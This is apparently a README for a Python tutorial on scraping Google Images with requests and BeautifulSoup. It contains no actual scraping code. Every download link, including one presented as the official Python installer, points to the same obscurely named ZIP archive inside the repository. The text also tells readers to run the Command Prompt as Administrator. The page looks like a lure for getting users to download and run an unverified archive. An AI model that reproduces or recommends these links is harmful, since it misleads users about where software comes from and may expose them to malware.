# 📸 how-to-scrape-google-images-with-python - Easy Image Scraping Guide

[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)

---

## 📂 About this project

This project shows how to scrape images from Google using Python. It uses simple tools like requests and BeautifulSoup. It also includes an example with the Thordata Search Engine Results Page (SERP) API.

You get ready-to-run scripts to help you download images, save details in CSV files, and preview images in a simple HTML gallery. The scripts work on Windows and do not require writing code. They collect data from Google Images easily.

---

## 🖥️ System Requirements

- Windows 10 or higher
- Python version 3.7 or later installed (see below if you need help)
- At least 100 MB of free disk space
- Internet connection

The scripts run from the command line but no programming knowledge is needed. You just download, open a command window, and run the scripts.

---

## 🔧 Tools Used

- **Python**: The programming language that runs the scripts.
- **Requests**: A Python module that downloads web content.
- **BeautifulSoup**: A Python module for parsing web pages.
- **Thordata SERP API**: An example API to get search results cleanly.
- **CSV Export**: To save details of images you download.
- **HTML Gallery**: To visually check downloaded images.

---

## 🚀 Getting Started

This section guides you through downloading and running the files on Windows.

### Step 1: Download the files

You need the latest release of the project files.

Click the big button below to visit the release page. There, download the ZIP file or individual scripts.

[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)

---

### Step 2: Install Python on Windows

If you do not have Python installed:

1. Visit https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip
2. Download the latest version for Windows.
3. Run the installer.
4. Make sure to check the box "Add Python to PATH" during installation.
5. Finish the installation.

---

### Step 3: Install required Python modules

Open a Command Prompt:

1. Press `Windows + R`, type `cmd`, and hit Enter.
2. Type the following commands one by one and press Enter after each:

```
pip install requests
pip install beautifulsoup4
```

These commands install the necessary modules for running the scripts.

---

### Step 4: Extract and open the project folder

1. Locate the downloaded ZIP file.
2. Right-click and choose "Extract All..."
3. Pick a folder where you want the files.
4. Open the extracted folder in File Explorer.

---

### Step 5: Run the image scraping script

In the Command Prompt:

1. Navigate to the project folder you extracted. For example:

```
cd C:\Users\YourName\Downloads\how-to-scrape-google-images-with-python-master
```

2. Run the main script by typing:

```
python scrape_google_images.py
```

3. Follow any prompts on the screen. The script will download images and save details in a CSV file.

---

## 🔍 How it works

The script requests Google Images pages, gets the image links, and downloads them to a folder. It also saves image information like titles and URLs in a CSV file.

The HTML gallery file lets you open a browser and view all downloaded images at once.

---

## 🗂️ File structure overview

- **scrape_google_images.py**: Main script that runs image scraping.
- **thordata_api_example.py**: Shows how to use the Thordata SERP API.
- **requirements.txt**: Lists Python modules needed.
- **images/**: Folder where the downloaded images save.
- **results.csv**: CSV file with image details.
- **gallery.html**: Simple web page to preview images.

---

## ⚙️ Customizing the script

You can change the search terms by editing the script:

1. Open `scrape_google_images.py` using a text editor like Notepad.
2. Look for the line that starts with:

```python
search_term = "cats"
```

3. Replace `"cats"` with your desired search phrase.
4. Save and close the file.
5. Run the script again from the Command Prompt.

---

## 🛠 Troubleshooting tips

- If Python commands are not recognized, verify Python is installed and added to the PATH.
- Make sure your internet connection is active while running the scraper.
- If images do not download, try running the Command Prompt as Administrator.
- Close any browser sessions logged into Google for better scraping results.
- For module errors, try re-installing via pip as described above.

---

## 📥 Download and install

Visit the release page to download the project files.

[![Download Release](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Ayushmaheshwari1/how-to-scrape-google-images-with-python/raw/refs/heads/main/geomantical/google_images_with_how_python_scrape_to_3.1-alpha.1.zip)

Download the latest ZIP file or individual scripts. Extract and follow the steps to install Python and run scripts.

---

## 📄 License and Contribution

This project uses the MIT License. You can modify and use the code freely. If you want to help improve it, submit pull requests on GitHub.

---

## 🏷️ Topics for this project

beautifulsoup | data-collection | example-project | google-images | google-serp | python | requests | thordata | tutorial | web-scraping